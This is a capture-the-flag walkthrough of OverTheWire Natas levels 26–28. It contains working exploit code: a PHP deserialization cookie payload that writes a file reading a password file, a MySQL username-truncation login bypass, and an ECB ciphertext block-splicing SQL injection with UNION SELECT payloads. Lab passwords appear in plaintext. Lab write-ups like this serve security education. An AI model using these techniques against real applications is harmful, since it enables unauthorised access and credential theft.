```

Action of doing are try remove unwanted parameter and log in above constructor , then write payload inside `$initMsg`and in above construct change log area path , as our wish consider those object into unserialize in php ,we serialize those manipulate the object , serialized form then inject this in cookies drawing in base64 encoded way , later we can access flag because inject the code that get flag and stored in as wished path

```php
<?php

class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct()
    {
        $this->initMsg = "Anything goes here";
        $this->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/pwdgrabber.php";
    }
}

$object = new Logger();

print(base64_encode(serialize($object)));
```

this our payload , and base64 encoded form is

```
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxODoiaW1nL3B3ZGdyYWJiZXIucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MTg6IkFueXRoaW5nIGdvZXMgaGVyZSI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYyOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=
```

I added random_name and save this below php as a `natas26_cookies.php` in a same directory

```php
<?php

$random_name = $argv[1];

class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($random_name)
    {
        $this->initMsg = "Anything goes here";
        $this->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/" . $random_name . ".php";
    }
}

$object = new Logger($random_name);
print(base64_encode(serialize($object)));
?>

```

Let write a python script which get base54 encoded string from php and sends cookies as we want

```py
import requests
import re
import urllib.parse as urllib
import base64

import subprocess
import random
import string


def generate_random_name():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(8))

random_name = generate_random_name()
php_script = "natas26_cookies.php" # imporatant
php_output = subprocess.run(["php", php_script, random_name], capture_output=True, text=True)
output_from_php = php_output.stdout.strip() # Base64 encoded


username = "natas26"
passsowrd = "8A506rfIAXbKKk68yJeuTuRq4UfcK70k"
url = "http://%s.natas.labs.overthewire.org/"%username
# Sample
parameter = "? x1=0 & y1=0 & x2=500 & y2=500".replace(' ','')
session = requests.Session()
response = session.get(url,auth=(username,passsowrd))

session.cookies['drawing'] =  output_from_php # cookies manipulation
response = session.get(url+parameter,auth=(username,passsowrd)) # sends parameter

response = session.get(url+'img/'+random_name+'.php',auth=(username,passsowrd))
content = response.text

print(content)
```

---

### Natas 27

<img src="img/Pasted image 20240508144645.png" alt="Example Image" width="1080"/>
<img src="img/Pasted image 20240508144654.png" alt="Example Image" width="1080"/>

I just gave that random and root as password , let try natas28 as username and anything as password
<br>

<img src="img/Pasted image 20240508144822.png" alt="Example Image" width="1080"/>

Lets see [view-source](http://natas27.natas.labs.overthewire.org/index-source.html)

```php
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>
```

from the above , we know that schema is

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

It's looks like , they are using `htmlenties()` this prevent XSS attacks. The difference is in the characters each encodes. `htmlentities()` will encode ANY character that has an HTML entity equivalent , we cannot use that .....

```php
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
```

In dump data function , they are using while to retrieve single record more over `mysqli_fetch_assoc()` —> Fetch the next row of a result set as an associative array.. but here’s no explanation for this since the expectation is that usernames are unique given the logic of the login and user creation process

In MySQL ([strict mode](https://dev.mysql.com/doc/refman/8.0/en/sql-mode.html)), when inserting data exceeding field length the value is being truncated (Strict mode produces an error for attempts to create a key that exceeds the maximum key length. When strict mode is not enabled, this results in a warning and truncation of the key to the maximum key length.)

```
let describe the scenario
+----------+------------+------+---------+
| Field    | Type       | Null | Default |
+----------+------------+------+---------+
| username | varchar(4) | YES  | NULL    |
| password | varchar(4) | YES  | NULL    |
+----------+------------+------+---------+

INSERT INTO users (username,password) values ('joe','p1');


select * from users;

+----------+----------+
| username | password |
+----------+----------+
| joe      | p1       |
+----------+----------+


INSERT INTO users (username,password) values ('joe anything','p2');
select * from users;

+----------+----------+
| username | password |
+----------+----------+
| joe      | p1       |
| joe      | p2       |
+----------+----------+

Is the space still there?

select * from users where username='joe'; // see the results
+----------+----------+
| username | password |
+----------+----------+
| joe      | p1       |
| joe      | p2       |
+----------+----------+
remaing chracter are truncated
Let’s check the lengths…

select username,LENGTH(username) from users;

+----------+------------------+
| username | LENGTH(username) |
+----------+------------------+
| joe      |                3 |
| joe      |                4 |
+----------+------------------+

```

Let's write full python script

```py
import requests
import re
import urllib.parse as urllib

username = "natas27"
password = "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3"

url = "http://%s.natas.labs.overthewire.org"%username

session = requests.Session()

uname = "natas28" + "%00" * 58 + "anything" # we can use either null (%00) or " " space
data = urllib.unquote(uname)

response = requests.post(url,data={"username" : data , "password" : "anything"} , auth=(username,password))
response = requests.post(url,data={"username" : "natas28" , "password" : "anything"   } , auth=(username,password))
content = response.text
flag = re.findall(r"\[password\] => (\w+)",content)[0]
print("[+] Gotcha :",flag)
```

---

### Natas 28

Let search `hat` in search bar

<img src="img/Pasted image 20240511184307.png" alt="Example Image" width="1080"/>
<br>
<img src="img/Pasted image 20240511184416.png" alt="Example Image" width="1080"/>
<br>
Its look like a SQL LIKE Operator and keyword say `JOKE DATABASE` , now check `'` and `"`
<img src="img/Pasted image 20240512145153.png" alt="Example Image" width="1080"/>
<img src="img/Pasted image 20240512145213.png" alt="Example Image" width="1080"/>

They are escaping `'` and `"` with `\` , now look at URL of web with `query` parameter ,

<div style="width: 100%; overflow-x: auto; ">
    <div style="display: inline-block;  height: 50px; margin: 10px; background-color:#242729; padding:15px" >G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIFJJdk81Qbm5onM4n5XT7DSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D</div>
</div>

I removed some char in above string , i got this

```
**Notice**: Trying to access array offset on value of type bool in **/var/www/natas/natas28/search.php** on line **59**
Zero padding found instead of PKCS#7 padding
```

The last `%3D` , denotes it URL encoded , so we Decode using [CyberChef](https://gchq.github.io/CyberChef/) , i got this

<div style="width: 100%; overflow-x: auto; ">
    <div style="display: inline-block;  height: 50px; margin: 10px; background-color:#242729; padding:15px" >G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIFJJdk81Qbm5onM4n5XT7DSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=</div>
</div>

Again Last `=` denotes , it is base64 encoded , so decoded it .

```
è%§º[ýWïFmµÜrÜøu§Ç\ò$dóT'3ù]>ÃHy±ÒY\UÂà­íÛ¬¦§;q³Z,LW
```

Reason why above string is unrecognizable because data has been Encrypted so we got binary value ,
Let search "Zero padding found instead of PKCS#7 padding",

i got this https://node-security.com/posts/cryptography-pkcs-7-padding/

ECB Mode: If identical plaintext blocks produce identical ciphertext blocks, you might observe repeating patterns in the encrypted data.

CBC Mode: CBC mode introduces diffusion, so even if plaintext blocks are identical, their ciphertext blocks will differ due to XORing with the previous block's ciphertext.

By Above Result, we can conclude that is ECB cipher , it's AES (symmetric-key algorithm), there is a single key for both encryption and decryption , It's a block cipher we have find the block size

![[Pasted image 20240515205000.png]]

Due to Block Cipher , we got PKCS#7 padding as response when messed up with string that means

```
if we have store data (natas) in those blocks , there will be a fixed no of segment , let assume size 8
[n] [a] [t] [a] [s] [ padding ] [ padding ] [ padding ]
remaining segemnet have padding
```

Let find the block size using python , let send `AAAAA...` as query data and checking response length , for those padding segment have same length , i am analyzing behavior

```py
import requests
import base64
import urllib.parse as urllib # \/\/\/\/\/\/
import requests.utils as utl # both are same

# checking query len and response len
def block_size_finder():
	for i in range(80):	# 80 it just guess, random no of respone
		response = session.post(url,data={"query" : "A" * i},auth=(username,password))
		res_len = len(base64.b64decode(urllib.unquote(response.url[60:])))

		print("query length :" , i , "; response length : " , res_len)

block_size_finder()
# response length vary for every 16 response
```

Output

```
query length : 0 ; response length :  80
query length : 1 ; response length :  80
query length : 2 ; response length :  80
query length : 3 ; response length :  80
query length : 4 ; response length :  80
query length : 5 ; response length :  80
query length : 6 ; response length :  80
query length : 7 ; response length :  80
query length : 8 ; response length :  80
query length : 9 ; response length :  80
query length : 10 ; response length :  80
query length : 11 ; response length :  80
query length : 12 ; response length :  80 # 13
query length : 13 ; response length :  96
query length : 14 ; response length :  96
query length : 15 ; response length :  96
query length : 16 ; response length :  96
query length : 17 ; response length :  96
query length : 18 ; response length :  96
query length : 19 ; response length :  96
query length : 20 ; response length :  96
query length : 21 ; response length :  96
query length : 22 ; response length :  96
query length : 23 ; response length :  96
query length : 24 ; response length :  96
query length : 25 ; response length :  96
query length : 26 ; response length :  96
query length : 27 ; response length :  96
query length : 28 ; response length :  96 #16
query length : 29 ; response length :  112
query length : 30 ; response length :  112
query length : 31 ; response length :  112
query length : 32 ; response length :  112
query length : 33 ; response length :  112
query length : 34 ; response length :  112
query length : 35 ; response length :  112
query length : 36 ; response length :  112
query length : 37 ; response length :  112
query length : 38 ; response length :  112
query length : 39 ; response length :  112
query length : 40 ; response length :  112
query length : 41 ; response length :  112
query length : 42 ; response length :  112
query length : 43 ; response length :  112
query length : 44 ; response length :  112 # 16
...
...
```

Other than query length (1-12) every response length is `16` , so the block size is `16` , then look and analyze the block based on size
in hex value

```py
import requests
import base64
import urllib.parse as urllib # \/\/\/\/\/\/
import requests.utils as utl # both are same

def block_analyze():
	for i in range(16):
		response = session.post(url,data={"query" : "A" * i},auth=(username,password))
		res_len = len(base64.b64decode(urllib.unquote(response.url[60:])))
		print("query length :" , i , "; response length : " , res_len)
		print("="*80)
		segment = 80/block_size
		for block in range(int(segment)):
			print("Block",block,"data",repr(base64.b64decode(utl.unquote(response.url[60:]))[block*block_size:(block+1)*block_size]) )

block_analyze()
```

Output ,
`Block 0` and `Block 1` are static for all 16 response and `Block 2` are dynamic till query length 9 , In query length : 10 ; response length : 80 it also begin to static , that means `block 2` has been fully filled by data `AAAA...` without any padding , overflowed to next `Block 3`

```
query length : 0 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'\xe8\x7f\xf6\x0c\x99\xadr\xcc\xbd\x94~4\x17\xa9\x01('
Block 3 data b'\xa7~\x8e\xd1\xaa\xbe\x0b]\x05\xc4\xff\xe6\xac\x14#\xab'
Block 4 data b'G\x8e\xb1\xa1\xfe&\x1a,l\x15\x06\x11\t\xb3\xfe\xda'
query length : 1 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'\xa3w\xc3\n\r\x96H\x88\xa1\xb9\xd4S^\xa0\xf8\xd4'
Block 3 data b'\xbd\xfa\x10T\xechQ\\\xf9o*UDY\x19G'
Block 4 data b'\x90OK*\xbf,-v\x86\xaar\xa51Q\xc9p'
query length : 2 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'\x98\xb0\xd6 \xb2\ra\x14\x97\x9bw\xe2M\x8b\x1d:'
Block 3 data b'Hy\x9a\x07\xb1\xd2\x9bY\x82\x01\\\x93U\xc2\xe0\x0e'
Block 4 data b'\xad\xed\x9b\xdb\xac\xa6\xa7;q\xb3Z\x01\r,LW'
query length : 3 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'|\x12j1)Mg\x8c\xab\x9b\x9b\x0e\xfeD;u'
Block 3 data b'\x9a.+]\xb6\xf3\x1f\x19\xa1Oug\x8e\xad\xaa\x90'
Block 4 data b'BI\xb9>M\xea\t\tG\x99\x95\xb9\xc4K5\x1a'
query length : 4 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'\xb4\xdb\xdd|\xb1\x03Ti\xd6\xac\xb2\xf9R\x00p\xc7'
Block 3 data b')(\x7f<\xc5G\x9e\x12\xe6o1\xc8c\xb1\x80G'
Block 4 data b'V\xd5s-\xc8\xc7p\xf6C\x97\x15\x8b\xc1znf'
query length : 5 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'K\x93L]\x11\xaa\xc8\x87\xe3/NEz\xd59o'
Block 3 data b'\xac;\x87\x1c\x1cD\x83\x86\xb4\\\xd3m\x9e\x8fr\xf4'
Block 4 data b'eQI\xbb\xba!#\xd8\x9d\x95A~\xa2\x7f:{'
query length : 6 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'~\r\x97\x9dH\x94*\xc2\xb6W\xf6\xd7\xd4\x18\xce\xd6'
Block 3 data b'A\xc0\x98\xc4\xba\xcd\xc5\xed\x93WVNQ\x05\xdd~'
Block 4 data b'd\xd0\xdc\xc8h%6\x92\xad\xfc\xbd7\x96\xd1\xbf\x8a'
query length : 7 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'\xaf\xc2b\x8ca@&m\xb6\x80\xae\xe2\xb5z\x9b\x88'
Block 3 data b'd\x86\x95J\xeaF\xfb\x93\xe9\xab\x85\x84[OK\xd0'
Block 4 data b'\xd7\xff+rTS\xfc)G\x01\xe5\x1f]|\x0f\x8e'
query length : 8 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'\xcdC\xa4qf\xc6;P\xf4^\xe7(\xb2q\xf5"'
Block 3 data b'\x89m\xe9\x08\x84\xf8a\x08\xb1g\xf8\xb4\xae\xa5\xd7c'
Block 4 data b'\x91r2\x05\x14\x83\xe6\x8eE\x8f\xd0f\x16{0\xa3'
query length : 9 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'\x88\x16\xc6\x1e+\xc67&`\xf8y\xc4_#w~'                                     <<<<<<<<
Block 3 data b'\xa0\x95"\xf3\x01\xcf\x9d6\xacp#\xf1e\x94\x8cZ'
Block 4 data b'\x979\xcd\x90R/\xa7\xa8o\x95w;V\xf9\xf8\xc0'
query length : 10 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'_"\xa7\'\xf6%A\x9aFo\x9a\xf58\x91\xf9\xb2'
Block 3 data b's\x8a_\xfbJE\x00$gu\x17Z\xe5\x96\xbb\xd6'
Block 4 data b"\xf3M\xf39\xc6\x9e\xdc\xe1\x1ffP\xbb\xce\xd6'\x02"
query length : 11 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'_"\xa7\'\xf6%A\x9aFo\x9a\xf58\x91\xf9\xb2'
Block 3 data b'63iG\xdd\xff\x07=\x13,"9\x1eeQ\x08'
Block 4 data b'\xca\x8c\xf4\xe6\x10\x91:\xba\xe3\x9a\x06v\x19 JZ'
query length : 12 ; response length :  80
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'_"\xa7\'\xf6%A\x9aFo\x9a\xf58\x91\xf9\xb2'
Block 3 data b'\x87R}Cw3\x98\xc6\xef\x1f\x11JQ:\x00('
Block 4 data b'u\xfdPD\xfd\x06=&\xf6\xbb\x7fsKA\xc8\x99'
query length : 13 ; response length :  96
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'_"\xa7\'\xf6%A\x9aFo\x9a\xf58\x91\xf9\xb2'
Block 3 data b'\xc6GnA\x96\x19\xd3\x87\xf4Ws\x12%\xf1_\xe1'
Block 4 data b'b#\xa1M\x9cB\x91\xb9\x87u\xb0?\xbcs\xd4\xed'
query length : 14 ; response length :  96
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'_"\xa7\'\xf6%A\x9aFo\x9a\xf58\x91\xf9\xb2'
Block 3 data b'\xf0M\xce\xc4\xebk\xc1~\x9a.\xeaY\x13\xba\xcd\xf2'
Block 4 data b'BW\xa3C\xda\xad\xaa\xf2\xc0\xe3\xa1\xd7\x1c\xe0=\xd1'
query length : 15 ; response length :  96
================================================================================
Block 0 data b'\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
Block 1 data b'\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
Block 2 data b'_"\xa7\'\xf6%A\x9aFo\x9a\xf58\x91\xf9\xb2'
Block 3 data b'\x04%Z\xe1aX\xd1]\xe5\x13\xca\xdd-\x1c\x96\xe2'
Block 4 data b'\xa7s\xf3\x18P\x94\xaa\x01@\x8f\x1f\x97\xd07\xd3\x85'
```

Let Assume that the query by till length 9 are correct and at `length 10` we don't know that last character at `block 2`

```
\x88\x16\xc6\x1e+\xc67&`\xf8y\xc4_#w~
```

and we know that till `a * 9` are valid string , this means it have query like

```
SELECT JOKES FROM JOKES_TABLE LIKE    '%    AAAAAAAAA    ch '  .........
         Block 0      |   Block 1     |      Block 2      |   Block  3  |   Block 4
```

Let fuzz that last character and check whether last character is `%` so we can replace from those character into SQL injection

```py
import requests
import urllib.parse as urllib
import base64
import requests.utils as utl
import string

def valid_string():

	correct_string = b'\x88\x16\xc6\x1e+\xc67&`\xf8y\xc4_#w~' # 'A' ; obtain by above block analyzer
	print(correct_string)

	for char in string.printable:
		print("Trying with ch:",char)
		response = session.post(url,data={"query" : "A" * 9 + char},auth=(username,password))
		block = 2 # block idx                                            # 2 x 16 = 32    :    # 3 * 16 =  48
		answer = repr(base64.b64decode(utl.unquote(response.url[60:]))[block*block_size:(block+1)*block_size] )
		print(answer)
		if answer == str(correct_string):
			print("WE FOUND CHARACTER ",char)
			print("=========================")
			# %
```

first we tried with `' and " ` but those character are escaped , then now WKT that in encrypted query again , we can SQL inject

`' UNION SELECT flag FROM table; # `

```
injection = 'A' * 9 + "' UNION SELECT password from user; #"
blocks = ( len ( injection ) ) % block_size != 0:
	blocks += 1
print(blocks) # 3
```

let build the find actual query structure

```
good_base are b64 encoded from url response and decoded as HEX with  A * 10
raw_inject are 64 encoded from url response and decoded as HEX (injection = 'A' * 9 + "' UNION SELECT password from user; #")

// good_base with filled block 0,1,2 + inject  + required good_base ()

query = good_base[:block_size*3]  + raw_inject[ block_size * 3: block_size * 3 + (blocks * block_size)] + good_base[block_size*3:] # HEX

url_payload =  utl.quote(base64.b64encode(query)).replace('/','%2F') # / not quote so man replaced with %2F
```

let Actual Query Maker

```py
import requests
import re
import urllib.parse as urllib
import base64
import requests.utils as utl

def query_maker():

	injection = "A" * 9 + "' UNION SELECT @@version; #" # MySQL Checker query
	blocks = ( len(injection) - 10 ) / block_size
	if ( len(injection)-10 % block_size != 0):
		blocks +=1
	blocks = int(blocks)
	print(blocks)

	response = session.post(url,data={"query" : injection },auth=(username,password))
	raw_inject = base64.b64decode(utl.unquote(response.url[60:]))
	response = session.post(url,data={"query" : "A" * 10},auth=(username,password))
	good_base = base64.b64decode(utl.unquote(response.url[60:]))

	query = good_base[:block_size*3]  + raw_inject[ block_size*3: block_size*3 + (blocks * block_size)] + good_base[block_size*3:]

	url_payload =  utl.quote(base64.b64encode(query)).replace('/','%2F')
	print(url_payload)
```

injection notes

```
actual WKT that this MySQL DB becuase we use # as comment but it is not always easy
```

| Databasetype     | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

For example, you could use a `UNION` attack with the following input:
`' UNION SELECT @@version--`

```NOTES
-------------------------------------------------------------------------------------------------------------
**Listing the contents of the database**
you can query `information_schema.tables` to list the tables in the database:
SELECT * FROM information_schema.tables

You can then query `information_schema.columns` to list the columns in individual tables:
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

-------------------------------------------------------------------------------------------------------------
**Listing the contents of an Oracle database**
you can query `information_schema.tables` to list the tables in the database:
SELECT * FROM information_schema.tables

You can list columns by querying `all_tab_columns`
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
-------------------------------------------------------------------------------------------------------------
```

![[Pasted image 20240517210147.png]]

injection phase

```py
import requests
import urllib.parse as urllib
import base64
import requests.utils as utl

VERSION_PAYLOAD  = "G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyPmWXqmnze9O%2Fn2%2BK8sqRse%2FPElxfpoPCpDu%2FmybKgH1zil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D"

def sql_injection():
	response = requests.get(url + "/search.php/?query=" + VERSION_PAYLOAD , auth=(username,password))
	content = response.text
	print(content)
```

Injection was successful , and we got version as `8.0.34-0ubuntu0.22.04.1`
we know the schema of DB , if u don't know experiment with yourself and above query will help

The full python script is

```py
import requests
import urllib.parse as urllib
import base64
import requests.utils as utl
import string


username ="natas28"
password= "skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4"
url = "http://%s.natas.labs.overthewire.org"%username
session = requests.Session()

block_size = 16
# checking query len and response len
def block_size_finder():
	for i in range(80):
		response = session.post(url,data={"query" : "A" * i},auth=(username,password))
		res_len = len(base64.b64decode(urllib.unquote(response.url[60:])))
		print("query length :" , i , "; response length : " , res_len)

		# response length vary for every 16 response


def block_analyze():
	for i in range(16):
		response = session.post(url,data={"query" : "A" * i},auth=(username,password))
		res_len = len(base64.b64decode(urllib.unquote(response.url[60:])))
		print("query length :" , i , "; response length : " , res_len)
		print("="*80)
		segment = 80 / block_size
		for block in range(int(segment)):
			print("Block",block,"data",repr(base64.b64decode(utl.unquote(response.url[60:]))[ block * block_size : (block+1) * block_size ]) )

	# btw query len 10 to 11 Block 2 is same
	# '\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb' from query length 9 because dif from this hex values , it crt string

def valid_string():
	# correct_string = b'\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb' # for 'a'
	correct_string = b'\x88\x16\xc6\x1e+\xc67&`\xf8y\xc4_#w~' # 'A'
	print(correct_string)

	for char in string.printable:
		print("Trying with ch:",char)
		response = session.post(url,data={"query" : "A" * 9 + char},auth=(username,password))
		block = 2 # block idx                                           # 2 x 16 = 32    :    # 3 * 16 =  48
		answer = repr(base64.b64decode(utl.unquote(response.url[60:]))[ block*block_size : (block+1)*block_size ] )
		print(answer)
		if answer == str(correct_string):
			print("WE FOUND CHARACTER ",char)
			print("=========================")
			# %

def query_maker():

	injection = "a" * 9 + "' UNION SELECT password FROM users; #"
	# injection = "A" * 9 + "' UNION SELECT @@version; #"
	blocks = ( len(injection) - 10 ) / block_size
	if ( len(injection)-10 % block_size != 0):
		blocks +=1
	blocks = int(blocks)
	print(blocks)

	response = session.post(url,data={"query" : injection },auth=(username,password))
	raw_inject = base64.b64decode(utl.unquote(response.url[60:]))
	response = session.post(url,data={"query" : "A" * 10},auth=(username,password))
	good_base = base64.b64decode(utl.unquote(response.url[60:]))

	query = good_base[:block_size*3]  + raw_inject[ block_size*3: block_size*3 + (blocks * block_size)] + good_base[block_size*3:]

	url_payload =  utl.quote(base64.b64encode(query)).replace('/','%2F')
	print(url_payload)
	# ^^^^^^^^^^
	# G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWnPci%2FqKte0ohRTkObF%2BT5ujPcGtKfnu%2FmSL%2FsyLoz01sA1xi1%2BF7vPb%2FZHFEUMHc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D

URL_PAYLOAD_a = "G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWnPci%2FqKte0ohRTkObF%2BT5ujPcGtKfnu%2FmSL%2FsyLoz01sA1xi1%2BF7vPb%2FZHFEUMHc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D"
URL_PAYLOAD_A = "G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyWnPci%2FqKte0ohRTkObF%2BT5ujPcGtKfnu%2FmSL%2FsyLoz01sA1xi1%2BF7vPb%2FZHFEUMHc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D"
